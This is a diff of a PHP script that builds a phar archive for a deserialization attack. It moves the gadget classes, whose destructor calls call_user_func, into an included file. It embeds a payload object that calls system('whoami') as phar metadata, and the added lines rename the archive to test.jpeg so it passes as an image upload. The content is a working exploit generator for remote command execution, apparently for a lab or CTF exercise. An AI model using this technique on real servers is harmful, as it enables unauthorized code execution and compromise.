@@ -1,35 +1,7 @@
 <?php
+include 'random_class.php';
 
-class AnyClass {
-	private $data;
-	private $desc;
-
-	public function __construct($data, $desc) {
-		$this->data = $data;
-		$this->desc = $desc;
-	}
-	
-	function __destruct() {
-		return new SupportClass($this->data, $this->desc);
-	}
-}
-
-class SupportClass {
-	private $callable;
-	public $newData;
-
-	public function __construct($callable, $data) {
-		$this->callable = $callable;
-		$this->newData = $data;
-	}
-
-	public function __destruct() {
-		@call_user_func($this->callable, $this->newData);
-	}
-
-}
-
-@unlink('test.phar');
+@unlink('test.jpeg');
 // create new Phar
 $phar = new Phar('test.phar');
 $phar->startBuffering();
@@ -43,3 +15,5 @@ $payload = new AnyClass('system', "whoami");
 
 $phar->setMetadata($payload);
 $phar->stopBuffering();
+
+rename("test.phar","test.jpeg");
